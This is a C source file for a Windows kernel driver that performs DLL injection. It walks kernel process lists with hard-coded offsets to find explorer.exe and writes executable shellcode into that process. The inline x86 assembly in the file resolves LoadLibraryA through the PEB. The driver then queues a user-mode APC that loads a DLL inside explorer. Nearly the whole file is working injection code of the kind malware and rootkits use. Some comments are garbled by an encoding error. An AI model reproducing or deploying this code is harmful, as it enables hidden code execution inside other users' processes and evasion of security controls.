#include "apc_inject_test.h"
#include "asm_export.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(INIT,DriverEntry)
#pragma alloc_text(PAGE,DriverUnload)
#pragma alloc_text(PAGE,ntLoadLibraryA)
#pragma alloc_text(PAGE,WorkThreAd_Exec)
#pragma alloc_text(PAGE,uSetTheApc_Exec)
#pragma alloc_text(PAGE,KernelApcCAllBAck_Exec)
#pragma alloc_text(PAGE,find_threAd_Exec)
#endif

BOOLEAN 
ntLoadLibraryA(
    PCHAR dllPath
    )
{
    NTSTATUS			status;
    HANDLE				hThreAd = NULL;

    if (strlen(dllPath) > 50)
    {
        KdPrint(("dllpath overflow\n"));
        return FALSE;
    }
    status = PsCreateSystemThread(&hThreAd,
        (ACCESS_MASK)0,
        NULL,
        (HANDLE)0,
        NULL,
        WorkThreAd_Exec,
        dllPath
        );
    if (!NT_SUCCESS(status))
    {
        KdPrint(("PsCreateSystemThread err\n"));
        return FALSE;
    }
    return TRUE;
}

VOID
WorkThreAd_Exec(
    IN PVOID pContext
    )
{
    POINTER			process = 0;
    POINTER         threAd = 0;
    POINTER			func_size = 0;
    POINTER			param_size = 0;
    HANDLE          hProcess = NULL;
    PKEVENT			pEvent = NULL;
    PVOID			func_address = NULL;
    PVOID			param_address = NULL;
    KAPC_STATE		ApcStAte = { 0 };
    PCHAR			dllPath = NULL;
    NTSTATUS        status = 0;

    dllPath = (PCHAR)pContext;
    //Ѱ��һ�����̵�eprocess���Ϳ��Բ���apc���̵߳��̶߳��� 
    if (!find_threAd_Exec(&process, &threAd))
    {
        KdPrint(("cAnnot find the right threAd\n"));
        PsTerminateSystemThread(STATUS_SUCCESS);
    }
    //����һ��event�������ṩ֪ͨ
    pEvent = ExAllocatePool(NonPagedPool, sizeof(KEVENT));
    if (!pEvent)
    {
        KdPrint(("ExAllocatePool(pEvent) fAiled\n"));
        PsTerminateSystemThread(STATUS_SUCCESS);
    }

#ifdef _WIN64
#ifdef INJECT_WOW64
    func_size = sizeof(shellcode);
#else
    func_size = (UCHAR*)call_loadlibrary_end - (UCHAR*)call_loadlibrary;
#endif
#else
    func_size = (UCHAR*)UserExec_end - (UCHAR*)UserExec;
#endif

    KdPrint(("size: %d\n", func_size));
    param_size = 50;
    status = ObOpenObjectByPointer((PVOID)process,
        OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,
        NULL,
        GENERIC_ALL,
        *PsProcessType,
        KernelMode,
        &hProcess
        );
    if (!NT_SUCCESS(status))
    {
        KdPrint(("ObOpenObjectByPointer false :%x\n", status));
        PsTerminateSystemThread(STATUS_SUCCESS);
    }
    //ʹ��mdl��win7��ע��ϵͳ���̱���  mdlû��ִ��Ȩ��  
    //��ѩ��MDL��NT5�ϻ��ǿ�ִ�еģ����ǵ���NT6�ϾͲ���ִ����
    //ZwAllocateVirtualMemory�ڲ���attach��detach���̲���
    //������ڴ��ͷŵ�ʱ�����ݾ���ҵ�����жϰ�
    status = ZwAllocateVirtualMemory(hProcess, &func_address, 0, &func_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        KdPrint(("ZwAllocateVirtualMemory false :%x\n", status));
        PsTerminateSystemThread(STATUS_SUCCESS);
    }
    status = ZwAllocateVirtualMemory(hProcess, &param_address, 0, &param_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        KdPrint(("ZwAllocateVirtualMemory false :%x\n", status));
        PsTerminateSystemThread(STATUS_SUCCESS);
    }
    //����apc������Ͳ������û���ַ�ռ�
    KeStackAttachProcess((PEPROCESS)process, &ApcStAte);
    RtlZeroMemory(func_address, func_size);

#ifdef _WIN64
#ifdef INJECT_WOW64
    RtlCopyMemory(func_address, shellcode, func_size);
#else
    RtlCopyMemory(func_address, call_loadlibrary, func_size);
#endif
#else
    RtlCopyMemory(func_address, UserExec, func_size);
#endif

    RtlZeroMemory(param_address, param_size);
    RtlCopyMemory(param_address, dllPath, param_size);
    KeUnstackDetachProcess(&ApcStAte);

    KeInitializeEvent(pEvent, NotificationEvent, FALSE);
    //����apc
    status = uSetTheApc_Exec(process, threAd, (POINTER)func_address, pEvent, param_address);
    if (NT_SUCCESS(status))
    {
        KeWaitForSingleObject(pEvent, Executive, KernelMode, FALSE, NULL);
        KdPrint(("apc inject success��\n"));
    }
    else
    {
        KdPrint(("apc inject failed��\n"));
    }
    ExFreePool(pEvent);
    PsTerminateSystemThread(STATUS_SUCCESS);
    KdPrint(("Never be here \n"));
}

NTSTATUS 
uSetTheApc_Exec(
    POINTER			process,
    POINTER			threAd,
    POINTER			MAppedAddress,
    PKEVENT			pEvent,
    PCHAR			dllPath
    )
{
    PKAPC			pkApc;
    BOOLEAN			ret;
    NTSTATUS		dwStAtus = STATUS_SUCCESS;

    *((CHAR*)threAd + USERAPCPENDING_OFFSET) = 1;
    pkApc = ExAllocatePool(NonPagedPool, sizeof(KAPC));
    if (pkApc == NULL)
    {
        KdPrint(("error:ExAllocAtePool\n"));
        return STATUS_INSUFFICIENT_RESOURCES;
    }

#if defined(_WIN64) && defined(INJECT_WOW64)
    //��64λϵͳ�в���32λ�û�apcʱapc������ַ��Ҫ�󲹺�������λ
    MAppedAddress = (~MAppedAddress + 1) << 2;
#endif

    //��ʼ��һ��APC
    KeInitializeApc(
        pkApc,
        (PKTHREAD)threAd,
        OriginalApcEnvironment,
        (PKKERNEL_ROUTINE)KernelApcCAllBAck_Exec,
        NULL,
        (PKNORMAL_ROUTINE)MAppedAddress,//UserApcCAllBAck,
        UserMode,	//�û�ģʽ
        (PVOID)dllPath
        );

    //����apc
    ret = KeInsertQueueApc(pkApc, pEvent, 0, 0);
    if (!ret){
        KdPrint(("KeInsertQueueApc err\n"));
        return STATUS_UNSUCCESSFUL;
    }
    return STATUS_SUCCESS;
}

VOID
KernelApcCAllBAck_Exec(
    PKAPC Apc,
    PKNORMAL_ROUTINE *NormAlRoutine,
    IN OUT PVOID *NormAlContext,
    IN OUT PVOID *SystemArgument1,
    IN OUT PVOID *SystemArgument2
    )
{
    PKEVENT		pEvent;
    //�ص��õ�ִ�е�ʱ��Ӧ������KiDeliverApc�ڲ��û�apc��KernelRoutine�õ�ִ�е�ʱ��,������ʵ����normalRoutine֮ǰҲ�������ǵ�apc����֮ǰִ�е�
    KdPrint(("NormAlContext: 0x%x\n", (POINTER)*NormAlContext));
    pEvent = (PKEVENT)*SystemArgument1;
    if (pEvent)
    {
        KeSetEvent(pEvent, IO_NO_INCREMENT, FALSE);
    }
    if (Apc)
    {
        ExFreePool(Apc);
    }
}

//�ҵ����ʵĲ���Ŀ��
BOOLEAN
find_threAd_Exec(
    OUT	POINTER	*process,
    OUT	POINTER	*threAd
    )
{
    POINTER			eproc;
    POINTER			begin_proc;
    POINTER			ethreAd;
    POINTER			begin_threAd;
    PLIST_ENTRY		plist_Active_procs;
    PLIST_ENTRY		plist_threAd;

    //��������
    eproc = (POINTER)PsGetCurrentProcess();
    if (!eproc)
    {
        return FALSE;
    }
    begin_proc = eproc;
    while (1)
    {
        //OBJECT_TABLE_OFFSET û�о�����������Ľ���
        if (0 == _stricmp((CHAR*)(eproc + IMAGEFILENAME_OFFSET), "explorer.exe") && (PVOID)(*(POINTER*)((char*)eproc + OBJECT_TABLE_OFFSET)) != NULL)
        {
            break;
        }
        else
        {
            plist_Active_procs = (LIST_ENTRY*)(eproc + ACTIVEPROCESSLINKS_OFFSET);
            eproc = (POINTER)plist_Active_procs->Flink;
            eproc = eproc - ACTIVEPROCESSLINKS_OFFSET;
            if (eproc == begin_proc)
            {
                return FALSE;
            }
        }
    }
    plist_threAd = (LIST_ENTRY*)(eproc + THREADLISTHEAD_OFFSET);
    ethreAd = (POINTER)plist_threAd->Flink;
    ethreAd = ethreAd - THREADLISTENTRY_OFFSET;
    KdPrint(("threAd: 0x%x\n", ethreAd));

    //�����߳�
    begin_threAd = ethreAd;
    while (1){
        KdPrint(("(*(POINTER*)((POINTER)ethreAd+TCB_TEB_OFFSET): 0x%x\n", *(POINTER*)((CHAR*)ethreAd + TCB_TEB_OFFSET)));
        if ((*(POINTER*)((POINTER)ethreAd + TCB_TEB_OFFSET) != 0))
        {
            break;
        }
        else{
            plist_threAd = (LIST_ENTRY*)(ethreAd + THREADLISTENTRY_OFFSET);
            ethreAd = (POINTER)plist_threAd->Flink;
            ethreAd = ethreAd - THREADLISTENTRY_OFFSET;
            KdPrint(("ethreAd: 0x%x\n", ethreAd));
            if (ethreAd == begin_threAd)
            {
                return FALSE;
            }
        }
    }
    *process = eproc;
    *threAd = ethreAd;
    return TRUE;
}

VOID 
DriverUnload(
    IN PDRIVER_OBJECT DriverObject
    )
{
    if (dllPath)
    {
        ExFreePoolWithTag(dllPath, 'HTAP');
    }
    KdPrint(("DriverUnload\r\n"));
}

NTSTATUS 
DriverEntry(
    IN PDRIVER_OBJECT DriverObject, 
    IN PUNICODE_STRING pRegistryString
    )
{
    DriverObject->DriverUnload = DriverUnload;
    dllPath = ExAllocatePoolWithTag(PagedPool, 50, 'HTAP');
    if (dllPath)
    {
        RtlCopyMemory(dllPath, "C:\\dlltest32.dll", 50);
        if (ntLoadLibraryA(dllPath))
        {
            return STATUS_SUCCESS;
        }
    }
    return STATUS_UNSUCCESSFUL;
}

#ifndef _WIN64
__declspec(naked)
UserExec(
    PCHAR	dllPath,
    PVOID	unused1,
    PVOID	unused2
    )
{
    __asm
    {
        push        ebp
        mov         ebp, esp
        sub         esp, 150h
        push        ebx
        push        esi
        push        edi
        pushad
        pushfd
        lea         ecx, [ebp - 4]
        mov         ebx, dword ptr fs : [0x00000030]
        mov         ebx, dword ptr[ebx + 0x0C]
        mov         ebx, dword ptr[ebx + 0x0C]
        mov         ebx, dword ptr[ebx]
        mov         ebx, dword ptr[ebx]
        mov         eax, dword ptr[ebx + 18h]
        mov         dword ptr[ecx], eax
        popfd
        popad
        mov         eax, dword ptr[ebp - 4]
        mov         dword ptr[ebp - 28h], eax
        mov         eax, dword ptr[ebp - 28h]
        mov         ecx, dword ptr[ebp - 28h]
        add         ecx, dword ptr[eax + 3Ch]
        mov         dword ptr[ebp - 2Ch], ecx
        mov         esi, dword ptr[ebp - 2Ch]
        add         esi, 18h
        mov         ecx, 38h
        lea         edi, [ebp + 0xFFFFFEF4]
        rep movs    dword ptr es : [edi], dword ptr[esi]
        mov         eax, 8
        imul        ecx, eax, 0
        mov         edx, dword ptr[ebp - 4]
        add         edx, dword ptr[ebp + ecx + 0xFFFFFF54]
        mov         dword ptr[ebp + 0xFFFFFEF0], edx
        mov         eax, dword ptr[ebp + 0xFFFFFEF0]
        mov         ecx, dword ptr[ebp - 4]
        add         ecx, dword ptr[eax + 20h]
        mov         dword ptr[ebp - 18h], ecx
        mov         eax, dword ptr[ebp + 0xFFFFFEF0]
        mov         ecx, dword ptr[ebp - 4]
        add         ecx, dword ptr[eax + 24h]
        mov         dword ptr[ebp - 0Ch], ecx
        mov         eax, dword ptr[ebp + 0xFFFFFEF0]
        mov         ecx, dword ptr[ebp - 4]
        add         ecx, dword ptr[eax + 1Ch]
        mov         dword ptr[ebp - 14h], ecx
        mov         eax, dword ptr[ebp + 0xFFFFFEF0]
        mov         ecx, dword ptr[eax + 10h]
        mov         dword ptr[ebp - 1Ch], ecx
        mov         dword ptr[ebp - 20h], 0
        jmp         s1
    s5 :
        mov         eax, dword ptr[ebp - 20h]
        add         eax, 1
        mov         dword ptr[ebp - 20h], eax
    s1 :
        mov         eax, dword ptr[ebp + 0xFFFFFEF0]
        mov         ecx, dword ptr[ebp - 20h]
        cmp         ecx, dword ptr[eax + 14h]
        jae         s2
        mov         eax, dword ptr[ebp - 20h]
        mov         ecx, dword ptr[ebp - 18h]
        mov         edx, dword ptr[ebp - 4]
        add         edx, dword ptr[ecx + eax * 4]
        mov         dword ptr[ebp - 8], edx
        mov         eax, dword ptr[ebp - 8]
        movsx       ecx, byte ptr[eax]
        cmp         ecx, 4Ch
        jne         s3
        mov         eax, dword ptr[ebp - 8]
        movsx       ecx, byte ptr[eax + 1]
        cmp         ecx, 6Fh
        jne         s3
        mov         eax, dword ptr[ebp - 8]
        movsx       ecx, byte ptr[eax + 2]
        cmp         ecx, 61h
        jne         s3
        mov         eax, dword ptr[ebp - 8]
        movsx       ecx, byte ptr[eax + 3]
        cmp         ecx, 64h
        jne         s3
        mov         eax, dword ptr[ebp - 8]
        movsx       ecx, byte ptr[eax + 4]
        cmp         ecx, 4Ch
        jne         s3
        mov         eax, dword ptr[ebp - 8]
        movsx       ecx, byte ptr[eax + 5]
        cmp         ecx, 69h
        jne         s3
        mov         eax, dword ptr[ebp - 8]
        movsx       ecx, byte ptr[eax + 6]
        cmp         ecx, 62h
        jne         s3
        mov         eax, dword ptr[ebp - 8]
        movsx       ecx, byte ptr[eax + 7]
        cmp         ecx, 72h
        jne         s3
        mov         eax, dword ptr[ebp - 8]
        movsx       ecx, byte ptr[eax + 8]
        cmp         ecx, 61h
        jne         s3
        mov         eax, dword ptr[ebp - 8]
        movsx       ecx, byte ptr[eax + 9]
        cmp         ecx, 72h
        jne         s3
        mov         eax, dword ptr[ebp - 8]
        movsx       ecx, byte ptr[eax + 0Ah]
        cmp         ecx, 79h
        jne         s3
        mov         eax, dword ptr[ebp - 8]
        movsx       ecx, byte ptr[eax + 0Bh]
        cmp         ecx, 41h
        jne         s3
        mov         eax, dword ptr[ebp - 20h]
        mov         ecx, dword ptr[ebp - 0Ch]
        movzx       edx, word ptr[ecx + eax * 2]
        mov         eax, dword ptr[ebp - 1Ch]
        lea         ecx, [edx + eax - 1]
        mov         dword ptr[ebp - 10h], ecx
        mov         eax, dword ptr[ebp - 10h]
        mov         ecx, dword ptr[ebp - 14h]
        mov         edx, dword ptr[ebp - 4]
        add         edx, dword ptr[ecx + eax * 4]
        mov         dword ptr[ebp - 24h], edx
        mov         eax, dword ptr[ebp + 8]
        push        eax
        call        dword ptr[ebp - 24h]
        mov         al, 1
        jmp         s4
    s3 :
        jmp         s5
    s2 :
        xor         al, al
    s4 :
        pop         edi
        pop         esi
        pop         ebx
        mov         esp, ebp
        pop         ebp
        ret
    }
}
__declspec(naked)
UserExec_end(VOID)
{

}
#endif
